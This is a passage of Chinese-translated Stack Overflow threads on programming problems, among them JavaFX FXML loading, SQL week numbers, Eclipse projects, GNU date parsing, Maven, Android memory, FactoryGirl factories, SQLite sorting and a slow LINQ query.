当我尝试加载与调用加载的控制器位于同一包中的 FXML 文件时，我得到一个 ClassNotFound 异常，该异常指的是正在加载的 FXML 文件的控制器类。当我尝试从与包含调用控制器的包不同的包中加载同名的 FXML 文件时，该文件按预期加载。

这是来自 projectselectorcontroller 类的代码。注释代码是导致异常的行。

```
@Override
public void Response(KWMessage Message)
{
    if(Message.getType() != -1)
    {
        switch(Message.getType())
        {
            case 6000:
                Platform.runLater(new Runnable()
                {
                    @Override
                    public void run()
                    {
                        //This file loads as expected   
                        ExtendedNode node = mainController.load("/newproject/newproject.fxml");

                        //This file does not load   
                        //ExtendedNode node = mainController.load("/projectselector/newproject.fxml");

                        NewProjectController controller = (NewProjectController)node.getController();
                        mainController.setCurrentNode(node);
                    }
                });
        }
    }
} 
```

这是加载方法。我检查了网址，发现它是正确的。两个控制器类是否有可能不能驻留在同一个包中？

```
public ExtendedNode load(String FXML)
{
        ExtendedNode node;

    URL location = getClass().getResource(FXML);
    FXMLLoader fxmlLoader = new FXMLLoader();
    fxmlLoader.setLocation(location);
    fxmlLoader.setBuilderFactory(new JavaFXBuilderFactory());
    try
    {
        node = new ExtendedNode();
        node.setNode((Parent)fxmlLoader.load(location.openStream()));
        node.setController((iMainController)fxmlLoader.getController());
        node.getController().setMainController(this);
    }
    catch (IOException ex){node = null;}
    return node;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T04:01:35.080

我能够毫无困难地加载与控制器类文件位于同一包中的 FXML 文件。我同样能够加载位于另一个可用包中的 FXML 文件，该包相对于控制器类所在的包。

加载 FXML 标记时发生 ClassNotFound 异常的一个常见原因是未正确命名标记文件根级节点中的控制器类。您需要在 fx:controller 属性中使用完全限定的 Java 对象名称，例如：

```
<AnchorPane id="AnchorPane" fx:id="ServicesEditor" maxHeight="-Infinity" maxWidth="-Infinity" 
    minHeight="-Infinity" minWidth="-Infinity" prefHeight="400.0" prefWidth="600.0" 
    styleClass="stage-pane" xmlns:fx="http://javafx.com/fxml"
    fx:controller="org.kkk.mm.censusassistant.GUIServicesEditorController"> 
```

我将首先检查您在两个位置的标记文件，以确保两者都具有您的控制器类的完全限定 Java 名称，并且都标识了正确的类。

如果控制器类在您的项目命名空间中被正确识别并且您仍然遇到 ClassNotFound 异常，那么我需要更多上下文来帮助您。您确定是 fxmlloader.load() 方法调用产生了这个错误吗？如果不...

您为加载标记显示的逻辑似乎很复杂。我不确定 ExtendedNode 对象在做什么或为什么要使用它们。

您正在使用：

```
FXMLLoader fxmlLoader = new FXMLLoader();
fxmlLoader.setLocation(location);
:
:
node.setNode((Parent)fxmlLoader.load(location.openStream())); 
```

因为您已经使用 setLocation 设置了 FXMLLoader 的 URL，所以您不需要使用 inputStream 调用 fxmlLoader。你可以简单地使用 fxmlLoader.load();

# asp.net - 从日期获取周数到下拉列表中

> ID：14220630
> 
> 赞同：0
> 
> 时间：2013-01-08T17:23:45.470
> 
> 标签：asp.net, sql, ms-access

我有一个数据库表，其中包含一行 DateTime 格式的日期。我需要做的是获取可用日期的所有不同周数。例如，如果我有以下日期：

```
03-JAN-13 
04-JAN-13
09-JAN-13 
```

sql 查询会给我以下周数：1 和 2。 PS：之后我会将这些值放在下拉列表中（这一步没问题）。

那么有人可以告诉我该怎么做吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:28:43.677

您没有指定您使用的 RDBMS，但您可以使用以下内容获取周数。

您将使用的 SQL Server [`DatePart()`](http://msdn.microsoft.com/en-us/library/ms174420.aspx)：

```
select distinct datepart(week, dates) WeekNo
from yourtable 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/d4555/3)

在 MySQL 中，您可以使用[`Week()`](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_week)：

```
select distinct week(dates)
from yourtable 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!2/c6f6a/2)

在 Oracle 中，您可以使用[`to_char()`](http://www.techonthenet.com/oracle/functions/to_char.php)：

```
select distinct to_char(dates, 'W') WeekNo
from yourtable 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!4/63922/4)

在 PostgreSQL 中，您可以使用以下内容：

```
select distinct extract(WEEK from dates) WeekNO
from yourtable 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!1/da8f7/3)

将 替换为`yourtable`您的表名和`dates`日期列。

编辑#1：如果您使用的是 MS Access，那么您仍然可以使用[`DatePart()`](http://office.microsoft.com/en-us/access-help/datepart-function-HA001228812.aspx)（在 MS Access 2003 中测试过）：

```
SELECT distinct datepart("ww", dates) as WeekNo
FROM yourtable; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T18:06:40.987

在您的加载事件中，或任何您想要的地方，您将放置此 VBA 代码

```
 Me!myCombo.RowSource = "yourquerytexthere;" 
```

（或者您使用的任何查询......可能是您在 Remou 为您回答的最后一个问题中使用的任何一个）。

我认为在这个问题中，您已经知道要查询什么，您只是在询问设置控件。

该代码只是

```
 Me!myCombo.RowSource = "yourquerystring" 
```

像

```
 Me!myCombo.RowSource = "SELECT distinct datepart("ww", dates) FROM yourtable;" 
```

其中 Me!myCombo 是您的组合框的名称。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-08T19:31:10.837

年度 ISO 周# 表 - Oracle SQL 查询：

```
-- ISO_WK# --
 SELECT mydate
      , TRUNC(mydate, 'w') wk_starts
      , TRUNC(mydate, 'w') + 7 - 1/86400 wk_ends
      , TO_NUMBER (TO_CHAR (mydate, 'IW')) ISO_WK#  
  FROM
   (
    SELECT TRUNC(SYSDATE, 'YEAR')-1 + LEVEL AS mydate  
      FROM dual
    CONNECT BY LEVEL <= 
    (-- First day of curr year - first day of past year --
      SELECT TRUNC(SYSDATE, 'YEAR')-TRUNC(ADD_MONTHS (SYSDATE, -12), 'YEAR') "Num of Days"   
        FROM dual
    )
  )
/ 
```

# eclipse - 如何在 Eclipse 中打开现有项目？

> ID：14220633
> 
> 赞同：36
> 
> 时间：2013-01-08T17:23:58.030
> 
> 标签：eclipse, project

我刚刚使用 Eclipse 创建了几个项目。现在重新启动 Eclipse 并希望查看其中一个项目。我该怎么做？

我已尝试将文件 -> 导入 -> 常规 -> 现有项目放入工作区。

然后我选择要处理的项目的目录，结果，我收到一条错误消息：“某些项目无法导入，因为它们已经存在于工作区中”。

所以，看起来我不需要导入项目，因为它们已经在工作区中......但是我如何“看到”工作区中的项目？如果我创建一个新项目，我会看到它以及所有其他现有项目，但我不想创建一个新项目只是为了查看现有项目。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-08T22:44:08.890

也许您已经关闭了项目并配置了项目浏览器视图来过滤已关闭的项目。

在这种情况下，请[查看 Project Explorer 视图中的过滤器](http://help.eclipse.org/indigo/index.jsp?topic=%2Forg.eclipse.jst.j2ee.doc.user%2Ftopics%2Fcjviewfilters.html)。确保在“过滤器”视图中禁用已关闭的项目。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2015-04-30T06:40:17.607

```
From the main menu bar, select command link File > Import.... The Import wizard opens.
Select General > Existing Project into Workspace and click Next.
Choose either Select root directory or Select archive file and click the associated Browse to locate the directory or file containing the projects.
Under Projects select the project or projects which you would like to import.
Click Finish to start the import. 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2016-11-29T05:15:55.430

如果您关闭了多个项目并尝试重新打开所有项目然后在 Windows-> 显示视图-> 导航器

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-03-09T19:49:59.110

从 Eclipse 主 gui 中：选择“Window->Show View->Other->General->Project Explorer” 双击“Project Explorer”会弹出“Project Explorer”窗口，其中显示了工作区中的每个项目。这对我有用。

祝你好运。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2020-07-17T08:28:57.883

如果您尝试将非 Maven 项目导入 Eclipse，请按照以下步骤操作，它对我有用。

首先将项目克隆到您的机器中，然后按照以下步骤在 eclipse 中导入。

> 项目资源管理器 -> 导入 -> Git -> 来自 git 的项目 -> 现有本地存储库 -> 添加 -> 选择项目根目录 ->（复选框）导入为常规项目 -> 下一步 -> 完成

谢谢。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-10-05T13:10:28.610

就像下面一样，这样做后它对我有帮助。

要在 IDE 中加载现有的 Eclipse 项目，您需要将它们导入 Eclipse 工作区。

1.  单击文件 > 导入 > 常规
2.  单击现有项目进入工作区。
3.  您可以直接在其原始位置编辑项目，也可以选择在工作区中创建项目的副本。
4.  选择包含要导入的项目的目录。
5.  单击完成。这会将项目导入当前工作区并将它们加载到 IDE 中。

请查看以下链接以供参考。 [https://www.microfocus.com/documentation/enterprise-developer/ed30/Eclipse/GUID-773A19C7-98B2-442D-9D36-240E20E3F2CE.html](https://www.microfocus.com/documentation/enterprise-developer/ed30/Eclipse/GUID-773A19C7-98B2-442D-9D36-240E20E3F2CE.html)

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-12-23T18:13:02.037

在 Eclipse 中，尝试 Project > Open Project 并选择要打开的项目。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-02-11T18:44:29.117

如果您关闭了多个项目并尝试重新打开所有项目，然后在`Project Explorer`中选择所有项目。转到`Project`-> `Open Project`。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2016-09-27T06:50:55.377

我也刚刚遇到了如何打开现有文件的问题。没有一个答案是有帮助的。这就是我自己尝试的原因。

> 方向：文件->打开文件->工作区（您在创建项目时首先选择）->包（您已经在其中创建了项目）-> src（源文件）->创建的包->

现在您的搜索项目的节点板格式。我希望它会有所帮助。如果这里有任何错误，请事先道歉。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2020-01-25T18:13:45.470

我就是这样做的。

文件 -> 从文件系统打开项目 -> 工作区中的现有项目

* * *

## 回答 #11

> 赞同：0
> 
> 时间：2020-06-13T20:51:27.510

使用快捷键`Alt`++或导航到 Windows- `Shift`> `W`Show View->Project Explorer

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2020-12-04T13:49:57.833

如果是 maven 项目，请转到文件 > 导入 > maven 项目 > 现有 maven 项目，然后浏览包含该项目的文件夹，选择文件夹然后单击完成。这对我有用

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2021-02-02T19:31:28.783

如果您关闭了项目，您可以通过转到顶部栏 (alt) > ͟Project > 打开项目 [顶部菜单 > 项目 > 打开项目](https://i.stack.imgur.com/wmNPG.png)轻松再次打开它 您将获得一个菜单，您可以在其中打开可能阻止您执行的已关闭项目通过文件菜单打开这些项目。 [在您浏览之前列出的菜单后，您可以打开任何关闭的项目的窗口](https://i.stack.imgur.com/OM9I4.png)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2021-03-01T04:34:24.473

对我来说，它在我从目录中删除`.classpath`和`.project`文件后工作

# shell - 如何使用 gnu 'date' 命令将自定义日期格式转换为备用格式？

> ID：14220636
> 
> 赞同：2
> 
> 时间：2013-01-08T17:24:10.347
> 
> 标签：shell, date

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T18:12:22.863

You probably will have to tinker with some environment variables (ex: `TZ`, `LC_ALL`, etc).

See [this page showing you most of the common environnement variables, and their meanings](http://pubs.opengroup.org/onlinepubs/7908799/xbd/envvar.html)

To try some: you can force the value to change *just for the duration of the following command* by putting them on the same line, before the command itself:

`TZ=.... LC_LANG=..... date -d .......`

will invoke `date -d ....` with the 2 environment variables `TZ` and `LC_LANG` set to a temporary value.

Some interresting pointers (I can't right now tell if there **is** a program that will take as input any locale's date and translate that to the relevant Epoch or Unix Timestamp... BUt there seems to be hope following that (looking quite standard) trail of online docs:

[http://pubs.opengroup.org/onlinepubs/9699919799/utilities/date.html](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/date.html)

[http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html#tag_08_02](http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap08.html#tag_08_02)

which talks, amongst many other, about:

```
LC_TIME
    This variable shall determine the locale category for date and time formatting information. It affects the behavior of the time functions in strftime(). Additional semantics of this variable, if any, are implementation-defined.

```

Which points to: [http://pubs.opengroup.org/onlinepubs/9699919799/functions/getdate.html](http://pubs.opengroup.org/onlinepubs/9699919799/functions/getdate.html)

which says in the middle:

```
The match between the template and input specification performed by getdate() shall be case-insensitive.

The month and weekday names can consist of any combination of upper and lowercase letters. The process can request that the input date or time specification be in a specific language by setting the LC_TIME category (see setlocale ).

```

and points to: [http://pubs.opengroup.org/onlinepubs/9699919799/functions/setlocale.html](http://pubs.opengroup.org/onlinepubs/9699919799/functions/setlocale.html)

... I wish you an happy reading ! Let us know what you find!

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-23T04:47:17.887

I finally figured this out with the aid of the [coreutils mailing list](http://lists.gnu.org/archive/html/coreutils/2013-01/msg00028.html). However, the example they give there uses perl. They specifically rely on the POSIX::strptime module, which does not come with a standard installation of perl. Therefore, I solved this with python, which has the `time` module. This module should be available in most installations of python2 and python3.

Here's how to use it programmatically:

### Python solution:

```
$ timestamp='2013年1月8日 20時19分'
$ time_format='%Y年%m月%d日 %H時%M分'
$ gdate -u -R -d "$(python -c 'import sys; from time import strptime; t=strptime(sys.argv[-1],"'$time_format'"); print("%d-%d-%d %d:%d"%(t.tm_year,t.tm_mon,t.tm_mday,t.tm_hour,t.tm_min))' $timestamp)"
Tue, 08 Jan 2013 20:19:00 +0000 
```

This works with both python2 and python3\. You can substitute any timestamp and format as you like.

### Perl solution

To document the answer given to me on coreutils, the perl solution is this (requires `POSIX::strptime`)

```
$ gdate -u -R -d "$(perl -MPOSIX::strptime -le 'my ($sec, $min, $hour, $mday, $mon, $year, $wday, $yday) = POSIX::strptime("$ARGV[0]","%Y年%m月%d日 %H時%M分&quot;);$year+=1900;$mon+=1;printf("%04d-%02d-%02d %0d:%02d\n",$year,$mon,$mday,$hour,$min);' "2013年1月8日 20時19分&quot;)" 
```

# java - 在 JBoss 上发布时通过 Maven 插件复制文件

> ID：14220638
> 
> 赞同：1
> 
> 时间：2013-01-08T17:24:13.023
> 
> 标签：java, maven, jboss, applet

我想运行一个 Java-Applet。我使用 JBoss 服务器。我使用 Maven。我使用 Eclipse。我使用 Eclipse 将企业存档中的 Web 存档部署到服务器上。

对于Applet，我需要Applet 的.class 文件位于applet.html 的可访问文件夹中。我的想法是将 .class-从目标文件夹复制到我的 Web 存档的资源文件夹。所以我在 Web-Maven-Project 的 pom.xml 中添加了以下插件：

```
<build>
    <plugins>
        <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-resources-plugin</artifactId>
            <version>2.4</version>
                            <goals>
                                <goal>deploy</goal>
                            </goals>
            <executions>
                <execution>
                    <id>copy-applet-related-classes</id>
                    <phase>package</phase>
                    <goals>
                        <goal>copy-resources</goal>
                    </goals>
                    <configuration>

                       <outputDirectory>${basedir}/target/LMS-Admin-Web-  0.0.1/resources/applet</outputDirectory>
                        <resources>
                            <resource>
                                <directory>${basedir}/target/classes/de/test/lms/applet</directory>
                                <filtering>true</filtering>
                            </resource>
                        </resources>
                    </configuration>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build> 
```

我想我搞砸了阶段和目标。当我为包设定“安装”目标并在我的项目文件夹中执行“mvn clean install”时，它曾经工作过。问题是当我在 Eclipse 中使用右键单击-> 发布时。我不知道，比跑什么目标。我尝试了很多，但它不适用于 JBoss 的独立/部署/...文件系统。事实证明这也很难用谷歌搜索。所以我会感谢任何想法、链接或其他帮助！

编辑：我发现，目标文件夹中的类文件夹在我发布时被编辑，但打包到 WAR 文件的 WEB 文件夹不是。也许我需要一个阶段，即包装之前？我明天要进一步调查。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T21:10:14.670

在我的项目中，我还需要一个小程序，需要将其复制到`classes`目录中。唯一的区别是我将小程序存储为工件（因此在罐子中）。我正在`process-resources`为此使用相位。在你的情况下可能也是。

如果您想打包您的小程序，我将添加我的解决方案。如果您想[签名](https://stackoverflow.com/questions/908748/how-do-i-sign-a-java-applet-for-use-in-a-browser)，您需要这样做。

```
 <plugins>
                <plugin>
                    <groupId>org.apache.maven.plugins</groupId>
                    <artifactId>maven-dependency-plugin</artifactId>
                    <version>2.2</version>
                    <executions>
                        <execution>
                            <id>copy-signed-applet</id>
                            <phase>process-resources</phase>
                            <goals>
                                <goal>copy</goal>
                            </goals>
                            <configuration>
                                <artifactItems>
                                    <artifactItem>
                                        <groupId>mygroupid</groupId>
                                        <artifactId>myapplet</artifactId>
                                        <version>${myapplet.version}</version>
                                        <outputDirectory>${project.build.outputDirectory}/path/to/applet</outputDirectory>
                                        <destFileName>myapplet.jar</destFileName>
                                    </artifactItem>
                                </artifactItems>
                            </configuration>
                        </execution>
                    </executions>
                </plugin>
            </plugins> 
```

如果您使用的是 Eclipse，则需要在`pluginManagement`. 确保目标`copy`有行动`execute`。

```
 <plugin>
                    <groupId>org.eclipse.m2e</groupId>
                    <artifactId>lifecycle-mapping</artifactId>
                    <version>1.0.0</version>
                    <configuration>
                        <lifecycleMappingMetadata>
                            <pluginExecutions>
                                <pluginExecution>
                                    <pluginExecutionFilter>
                                        <groupId>
                                            org.apache.maven.plugins
                                        </groupId>
                                        <artifactId>
                                            maven-dependency-plugin
                                        </artifactId>
                                        <versionRange>
                                            [2.2,)
                                        </versionRange>
                                        <goals>
                                            <goal>copy</goal>
                                        </goals>
                                    </pluginExecutionFilter>
                                    <action>
                                        <execute/>
                                    </action>
                                </pluginExecution>
... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-11T16:53:24.360

您可以尝试使用 Git 参数插件：[https ://wiki.jenkins-ci.org/display/JENKINS/Git+Parameter+Plugin](https://wiki.jenkins-ci.org/display/JENKINS/Git+Parameter+Plugin)

它应该可以帮助你。

# java - 我的应用程序中的内存管理错误

> ID：14220641
> 
> 赞同：0
> 
> 时间：2013-01-08T17:24:20.323
> 
> 标签：java, android, oop, media

我用java制作了一个android应用程序在模拟器中运行良好，但在真正的手机上它崩溃了，它只是让`out of memory error`我的应用程序有63张图片，10首音频歌曲，4个视频。我的应用程序的总大小为 141 MB 我怎样才能防止出现此错误，是因为我有太多数据，还是有更好的方法将我的媒体存储在我的应用程序中。

这里有一些图片

1 个音频库

视频库

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T19:26:06.363

不建议将数据存储在图像、声音和视频等应用程序中。同样，将您的应用程序与歌曲、图像和视频一起赠送可能会导致您面临版权和盗版诉讼。但如果您有自己的数据，那么我建议您应该为您的应用程序实现客户端/服务器架构。从服务器托管项目并在需要时在您的应用程序中检索它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-08T17:42:19.643

关于设备可以容纳的内存，

堆大小取决于您运行应用程序的硬件。例如，G1 上 16mb，nexus 上 32mb。不要认为你可以做很多事情。如果您的目标版本低于 3.0，那就是。

正如谷歌所指出的那样，所有使用它都会激怒您的应用程序的用户。您的应用程序将消耗更多内存，因此会更快地将其他应用程序踢出内存。一些用户不会喜欢这种行为。而且，这很可能只是平板电脑的选择——我不认为冰淇淋三明治手机一定会支持 android:largeHeap

我相信一旦加载了资源，内存就会被初始化......希望您尝试在超出 Android 中堆内存的活动中加载资源，这就是您内存不足的原因。

# ruby-on-rails-3 - rails 3 - FactoryGirl 创建关联记录

> ID：14220645
> 
> 赞同：4
> 
> 时间：2013-01-08T17:24:34.017
> 
> 标签：ruby-on-rails-3, associations, factory-bot

我正在尝试创建一些测试数据来填充我的表格，以便我可以在我的网站上测试功能。

有问题的表是：`songs`、`song_arrangements`和`song_arrangement_files`。以这种方式关联。

```
Songs:
    has_many :song_arrangements, :dependent => :destroy
    has_many :song_arrangement_files, :through => :song_arrangements

Song Arrangements:
    belongs_to :song
    has_many :song_arrangement_files, :dependent => :destroy

Song Arrangement Files:
    belongs_to :song
    belongs_to :song_arrangement 
```

我已经能够使用 FactoryGirl 使用以下代码创建 25 首歌曲：

```
Code in my spec file:
    before { FactoryGirl.create_list(:song, 25) }

Code in the factory:
    FactoryGirl.define do
        factory :song do |s|
            s.sequence(:title) { |n| "Song Title #{n}" }
            s.sequence(:artist) { |n| "Song Artist #{n}" }
        end
    end 
```

关于如何创建`song_arrangements`以及`song_arrangement_files`与它们各自`song_arrangement`或`song`记录正确关联的任何想法？

我猜我可以`after(:create)`以某种方式在我的工厂中使用嵌套。我对 FactoryGirl 很陌生，而且对 Rails 总体来说还是很陌生。任何帮助深表感谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-10T16:16:59.833

所以我的另一个答案帮助我完成了我需要做的事情；但是，我基本上需要更深入的关联，并且我正在用那个解决方案碰壁。我结束了重新阅读有关关联的 FactoryGirl 文档，并提出了适用于我所有情况的解决方案。它创建歌曲、song_arrangements 和 song_arrangement_files。我确信代码不是很漂亮，但它可以工作并且可以在以后改进。希望这可以帮助遇到相同类型障碍的任何人。

```
FactoryGirl.define do
  factory :song do |s|
    s.sequence(:title) { |n| "Song Title #{n}" }
    s.sequence(:artist) { |n| "Song Artist #{n}" }

    factory :song_with_song_arrangements do
      ignore do
        song_arrangements_count 100
      end

      after(:create) do |song, evaluator|
        FactoryGirl.create_list(:song_arrangement, evaluator.song_arrangements_count, song: song)
      end
    end
  end

  factory :song_arrangement do |sa|
    song

    sa.sequence(:title) { |n| "Arrangement #{n}" }
    original_key 'A'
    bpm 75
    sa.sequence(:chart_content) { |n| "This is the chart content for Arrangement #{n}." }
    chart_mapping 'V1, C, V2, C, B, C, C'
    sa.sequence(:notes) { |n| "These are notes for the Arrangement #{n}." }

    factory :song_arrangement_with_song_arrangement_files do
      ignore do
        song_arrangement_files_count 100
      end

      after(:create) do |song_arrangement, evaluator|
        FactoryGirl.create_list(:song_arrangement_file, evaluator.song_arrangement_files_count, song_arrangement: song_arrangement)
      end
    end
  end

  factory :song_arrangement_file do |saf|
    song_arrangement
    song

    saf.sequence(:title) { |n| "Attachment #{n}" }
    url 'http://www.google.com'
    saf.sequence(:description) { |n| "This is the description of Attachment #{n}." }
  end
end 
```

用于调用这些工厂的代码：

```
Songs:
    before(:each) { FactoryGirl.create_list(:song, 25) }
Song Arrangements:
    before(:each) { FactoryGirl.create(:song_with_song_arrangements) }
Song Arrangement Files:
    before(:each) { FactoryGirl.create(:song_arrangement_with_song_arrangement_files) } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-08T22:25:00.433

对于遇到此问题的其他任何人，这是我提出的解决方案。正如我所说，我是 FactoryGirl 的新手，所以如果有更好的方法，请分享！

```
FactoryGirl.define do
  factory :song do |s|
    s.sequence(:title) { |n| "Song Title #{n}" }
    s.sequence(:artist) { |n| "Song Artist #{n}" }

    before(:create) do |song|
      song.song_arrangements << FactoryGirl.build_list(:song_arrangement, 10)
    end
  end

  factory :song_arrangement do |sa|
    sa.sequence(:title) { |n| "Arrangement #{n}" }
    original_key 'A'
    bpm 75
    sa.sequence(:chart_content) { |n| "This is the chart content for Arrangement #{n}." }
    chart_mapping 'V1, C, V2, C, B, C, C'
    sa.sequence(:notes) { |n| "These are notes for the Arrangement #{n}." }
  end
end 
```

在信用到期时给予信用，我实际上在从这篇文章中进行了大量搜索后找到了答案：[如何使用工厂女孩创建带有 has_many 的关联列表，并在创建时进行验证](https://stackoverflow.com/questions/10421200/how-to-user-factory-girl-to-create-associated-lists-with-a-has-many-with-a-valid?rq=1)

我从中提取了解决方案是 Blizzo 的回答。

# java - Android 和 Arduino 开发入门

> ID：14220650
> 
> 赞同：-2
> 
> 时间：2013-01-08T17:25:12.410
> 
> 标签：java, android, arduino, development-environment

我在使用 Netbeans IDE 在 Java 中进行 Web 和应用程序开发方面拥有超过一年的专业经验……现在，对于我公司打算开发的几个应用程序，我需要开始使用 Android 开发。我们最终计划进入基于 Android 和 Arduino 的应用程序和嵌入式系统开发。

说了这么多，我想请大家谈谈我应该如何开始 Android 开发...

我想知道的是

1.  从 Android 的角度来看，哪个 IDE 更好？Netbeans 还是 Eclipse？
2.  Android中有没有像Struts hibernate这样的框架和像jQuery这样的UI开发框架？
3.  我们计划为我们现有的应用程序（如 ERP 解决方案和其他应用程序）提供 android 版本。它们是使用 Struts2 和 jQuery 用 Ja​​va 构建的。我们应该如何开始将它们移植到 android 上？
4.  当我在 netbeans 中开始使用 Android 时，它询问了我正在开发应用程序的 Android 版本，例如 3,4.0 和其他版本。那么在开始开发时我们应该考虑哪个版本的 Android 操作系统？

注意：我是一位经验丰富的 Java 开发人员，但绝对是 Android 的初学者。欢迎发表关于我们如何从 Android 和 Arduino 开始的帖子和意见...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-08T17:29:39.230

Eclipse 由 Google 正式支持，虽然我个人最喜欢的是[IntelliJ](http://www.jetbrains.com/idea/)。

如果您想基于现有的 Web 应用程序创建 Android 应用程序，您可能需要研究诸如[PhoneGap](http://phonegap.com/)之类的东西。

我通常将我的最低 SDK 设置为 8 (Froyo)，因为许多用户的设备上仍然有旧软件。我还没有遇到太多的人拥有带有早期软件的手机。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-08T17:32:46.453

官方支持的开发工具是[Eclipse ADT 插件](http://developer.android.com/tools/sdk/eclipse-adt.html)。

要决定要开发哪个版本，您应该查看[此图表](http://developer.android.com/about/dashboards/index.html)。它显示了android版本的分布。您想要访问的设备越多，您必须支持的版本就越旧。我认为 2.2 或 2.3 是一个很好的开始版本。

像 Struts 或 Hibernate 这样的框架对于 Android 来说太大了。您可以使用 SQLite ORM 框架代替 Hibernate，例如[Green Dao Orm](http://greendao-orm.com/)或[OrmLite](http://ormlite.com/sqlite_java_android_orm.shtml)

您也不应该尝试将现有的 Struts 应用程序移植到 Android。

*   如果您想创建一个原生 Android 应用程序，您应该使 UI 适应[Android UI 指南](http://developer.android.com/design/index.html)。请记住，您不需要在 Android 应用程序中使用 Struts 应用程序的所有功能。您应该将功能减少到对移动设备有用的功能
*   另一种方法是创建现有网站的移动版本并在移动设备上显示该网站。使用这种方式，您可以使用现有应用程序的大部分内容。如果您想在 android 市场上拥有一些东西，您可以创建一个仅用于显示移动网站的小应用程序。

# java - 使用“ORDER BY”对 SQLite 表进行排序 - Android

> ID：14220651
> 
> 赞同：0
> 
> 时间：2013-01-08T17:25:13.477
> 
> 标签：java, android, sqlite, sorting, sql-order-by

我的高分表有一个 SQLite 数据库。目前，我在检查新分数是否获得高分以及对高分表进行排序时遇到问题。

当游戏结束时，Results.java 被调用。

**结果.java**

```
total_score = dh.calculateTotalScore(score, percentage);
low_score = dh.check(score, percentage, total_score);
if(total_score > low_score) {
    dh.delete(10);
    dh.insert(score, percentage, total_score);
} else {
    dh.insert(score, percentage, 9999999);
}
dh.sort(); 
```

所有被调用的方法`Results.java`都来自`DatabaseHelper.java`.

**数据库助手.java**

```
public void sort() {
    db.rawQuery("SELECT * FROM " + DB_TABLE + " ORDER BY " + TOTAL_SCORE, null);
}

public long calculateTotalScore(long score, int percentage) {
    long i;
    return i = (percentage * 1000) + score;
}

public long check(long score, int percentage, long sum) {
    Cursor c = db.rawQuery("SELECT " + TOTAL_SCORE + " FROM " + DB_TABLE, null);
    long count = c.getCount();
    long low_score;
    if(count == 10) {
        c.moveToLast();
        low_score = c.getInt(c.getColumnIndex(TOTAL_SCORE));
        return low_score;
    } else {
        return count;
    }
}

public long insert(long score, int percentage, long total_score) {
    ContentValues values = new ContentValues();
    values.put(SCORE, score);
    values.put(PERCENTAGE, percentage);
    values.put(TOTAL_SCORE, total_score);

    return db.insert(DB_TABLE, null, values);
}

public void delete(int row) { 
    db.delete(DB_TABLE, RANK + "=" + row, null);
} 
```

TOTAL_SCORE 的输出显示如下：

*   1
*   2
*   40851
*   1
*   2
*   40804
*   60811
*   60811
*   50816

我希望输出按数字顺序排列。像这样：

*   1
*   1
*   2
*   2
*   40804
*   40851
*   50816
*   60811
*   60811

它们在上面的顺序（我认为）只是它们插入数据库的顺序。程序运行时不会发生错误并且程序不会崩溃。如果需要，可以提供更多代码。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-08T17:36:58.537

`SELECT`不修改任何东西；你的`sort`功能没有效果。（该`rawQuery`函数*返回*已排序的记录列表，但您忽略它。）

您必须将该`ORDER BY`子句放入用于显示分数的查询中。

# c# - Linq Where 语句的性能缓慢

> ID：14220654
> 
> 赞同：1
> 
> 时间：2013-01-08T17:25:31.053
> 
> 标签：c#, linq

我有一个`List`（`Objects`大约 100k）必须迭代才能生成`Dictionary`. 但是代码执行得很慢，特别是在一行上

```
public class Item{
        public int ID;
        public int Secondary_ID;
        public string Text;
        public int Number;
} 
```

数据看起来像（100k 行）

```
ID  | Secondary_ID |      Text       | Number
1   |    1         | "something"     | 3
1   |    1         | "something else"| 7
1   |    1         | "something1"    | 4
1   |    2         | "something2"    | 344
2   |    3         | "something3"    | 74
2   |    3         | "something4"    | 1 
```

我希望它在完成后看起来像这样。（说实话，任何收藏都可以）

```
 Dictionary<int, string> 

Key             | Value
(secondary_ID)  | (Text : Number)

1               | "Something : 3, Something else : 7, Something1 : 4"
2               | "Something2 : 344"
3               | "Something3 : 74, Something4 : 1" 
```

我的代码目前像这样工作，`ListAll`包含所有数据。

```
var Final=new Dictionary<int, string>();
var id1s=ListAll.Select(x => x.ID).Distinct().ToList();

foreach(var id1 in id1s) {
    var shortList=ListAll.Where(x => x.ID==id1).ToList(); //99% of time spent is here
    var id2s=shortList.Select(x => x.Secondary_ID).Distinct().ToList();

    foreach(var id2 in id2s) {
        var s=new StringBuilder();
        var items=shortList.Where(x => x.Secondary_ID==id2).ToList();

        foreach(var i in items) {
